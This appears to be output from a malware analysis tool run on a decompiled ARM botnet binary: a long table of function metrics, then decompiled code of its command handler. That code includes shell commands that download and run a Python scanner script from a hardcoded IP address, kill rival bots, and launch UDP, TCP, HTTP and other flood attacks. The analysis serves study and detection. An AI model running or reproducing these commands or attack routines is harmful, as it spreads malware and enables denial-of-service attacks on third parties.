----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__default_sa_restorer                             |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |125     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idivmod                                   |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_12344                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_16414                                    |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpeq                                    |5   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |330     |0             |0           |
----------------------------------------------------------------------------------------------
__floatdidf                                       |2   |103     |0             |0           |
----------------------------------------------------------------------------------------------
function_1a314                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |111     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_13ba8                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ui2d                                      |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___errno_location                             |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |153     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |2   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
fstat                                             |0   |118     |0             |0           |
----------------------------------------------------------------------------------------------
function_161e8                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |113     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |135     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
gettimeofday                                      |2   |109     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_lr                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |2   |127     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat_conv                                      |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |118     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_stat                                         |2   |116     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__cmpdf2                                          |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |103     |0             |0           |
----------------------------------------------------------------------------------------------
uname                                             |1   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |111     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_htons                                        |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_1278c                                    |4   |107     |0             |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |4   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_14188                                    |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_1d428                                    |0   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr0                            |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |2   |109     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpge                                    |4   |102     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r2                                      |1   |102     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |123     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_1931c                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_180a8                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |6   |122     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |113     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |111     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |112     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpgt                                    |0   |102     |0             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r6                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_ip                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
function_1ccb8                                    |0   |703     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |6   |103     |0             |0           |
----------------------------------------------------------------------------------------------
bzero                                             |2   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dsub                                      |4   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r7                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_ntohs                                        |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_13dcc                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |109     |0             |0           |
----------------------------------------------------------------------------------------------
_pthread_cleanup_push_defer                       |3   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r8                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |5   |112     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |164     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |311     |0             |0           |
----------------------------------------------------------------------------------------------
function_16078                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |143     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |0   |126     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |101     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |125     |0             |0           |
----------------------------------------------------------------------------------------------
function_1d1f8                                    |2   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_fp                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |109     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |3   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |0   |194     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |112     |0             |0           |
----------------------------------------------------------------------------------------------
sleep                                             |1   |129     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |121     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_sp                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_1291c                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdcmple                                   |0   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |113     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |1   |250     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d                                             |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat32_conv                                    |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdrcmple                                  |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |5   |100     |0             |0           |
----------------------------------------------------------------------------------------------
skip_nospace                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_htonl                                        |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_13fe0                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |5   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__default_rt_sa_restorer                          |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__gtdf2                                           |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_ntohl                                        |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |131     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr2                            |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
function_1cf34                                    |0   |120     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpid                                       |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__floatsidf                                       |1   |112     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |102     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r1                                      |1   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__ltdf2                                           |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |105     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |110     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |109     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_1                                           |3   |111     |0             |0           |
----------------------------------------------------------------------------------------------
function_1cc58                                    |4   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_lseek64                                      |4   |118     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |2   |113     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |172     |0             |0           |
----------------------------------------------------------------------------------------------
fdopendir                                         |1   |140     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r3                                      |1   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |0   |111     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |106     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |4   |126     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |5   |126     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmple                                    |0   |102     |0             |0           |
----------------------------------------------------------------------------------------------
function_1a8a4                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dmul                                      |4   |435     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostname                                  |2   |123     |0             |0           |
----------------------------------------------------------------------------------------------
function_164b8                                    |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |107     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |109     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r0                                      |1   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_sl                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
mremap                                            |4   |110     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |119     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |4   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ul2d                                      |2   |102     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |120     |0             |0           |
----------------------------------------------------------------------------------------------
function_1d064                                    |0   |160     |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_mutex_init                              |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__extendsfdf2                                     |1   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_opendir                                      |1   |139     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr1                            |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
function_1a2d0                                    |1   |106     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r9                                      |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_open                                         |2   |114     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
function_1cc04                                    |0   |126     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmplt                                    |4   |102     |0             |0           |
----------------------------------------------------------------------------------------------
function_1629c                                    |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
bsd_signal                                        |2   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |116     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 12731
++++++++ FUNCTION END 17878
++++++++ FUNCTION LENGTH 5147
            ClearHistory(__libc_system((int32_t)"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py"));
            sockprintf(v92, (int32_t)"INSTALLING PYTHON SCANNER");
            ClearHistory(__libc_system((int32_t)"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py"));
            sockprintf(v92, (int32_t)"UPDATING PYTHON SCANNER");
            ClearHistory(__libc_system((int32_t)"killall -9 python;pkill python"));
            sockprintf(v92, (int32_t)"STOPPING PYTHON SCANNER");
            ClearHistory(__libc_system((int32_t)"cd /.tmp;python good2.py 1000 LUCKY 1 3"));
            sockprintf(v92, (int32_t)"STARTING VOIDS HACKA SCANNA");
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v92, (int32_t)"PONG!");
            getdtablesize();
            sockprintf(v92, (int32_t)"%d");
                sockprintf(v92, (int32_t)"UPDATE TAKEN SUCCESFULLY");
                        kill(v146, 9);
                        sockprintf(v92, (int32_t)"STOPPING SCANNER");
                            int32_t v147 = __libc_fork(); // 0xf85c
                                __GI_inet_ntoa(v95);
                                sockprintf(v92, (int32_t)"STARTING SCANNER ON -> %s");
                                if (__GI_strcoll((char *)*a2, (int32_t)"NETIS") == 0) {
                                        kill(v131, 9);
                                        __GI_inet_ntoa(v95);
                                        sockprintf(v92, (int32_t)"STOPPING NETIS SCANNER");
                                            v104 = __libc_fork();
                                                __GI_inet_ntoa(v95);
                                                v143 = sockprintf(v92, (int32_t)"STARTING NETIS SCANNER");
                                                NetisScanner(v143);
                                                    if (listFork() == 0) {
                                                        __GI_inet_ntoa(v95);
                                                        v144 = sockprintf(v92, (int32_t)"COMMENCING BOT KILL ON -> %s");
                                                        botkiller(v144);
                                                if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                                    __GI_inet_ntoa(v95);
                                                    sockprintf(v92, (int32_t)"My Public IP: %s");
                                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                                return sockprintf(v92, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v133, v114, v115, v116, v117, v97, v103, v102);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                                result = sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                                                result = sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendTCP(v140, v121, v122, v123, v141, v100, v101);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendTCP(v98, v121, v122, v123, v141, v100, v101);
                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                        int32_t result2 = listFork(); // 0x10270
                                                                                                                                        sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                                                                v166 = listFork();
                                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                result3 = sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                                        int32_t result4 = listFork(); // 0x10480
                                                                                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                                                                                                            v166 = listFork();
                                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                    sockprintf(v92, (int32_t)"None Killed.");
                                                                                                                                                                                                    sockprintf(v92, (int32_t)"Killed %d.");
                                                                                                                                                                                            if (*v169 != __GI_getpid()) {
                                                                                                                                                                                                kill(v171, 9);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v155, v158, v159, 0);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                            result3 = sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v148, v151, v152, 0);
                                                                                                                                                                __GI_close(v92);
                                                                                                                                                                            v166 = listFork();
                                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                            result3 = sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                                        v166 = listFork();
                                                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                        result3 = sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                        return sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendHTTP(*v105, *(int32_t *)(v91 + 8), (int16_t)v174, v177, v175, atol(v176));
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                                                                                                    v166 = listFork();
                                                                                                                                                                                        sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v153, v151, v152, 0);
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v160, v158, v159, 0);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                    sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP(*v105, v126, (int16_t)(v106 % 0x10000), v128, v107, v108);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v153, v151, v152, 0);
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v153, v151, v152, 0);
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v160, v158, v159, 0);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendSTD(v160, v158, v159, 0);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v153, v151, v152, 0);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v160, v158, v159, 0);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v160, v158, v159, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                                            sockprintf(v92, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendSTD(v160, v158, v159, 0);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v92, (int32_t)"STD <target> <port> <time>");
                                                                                                    sockprintf(v92, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
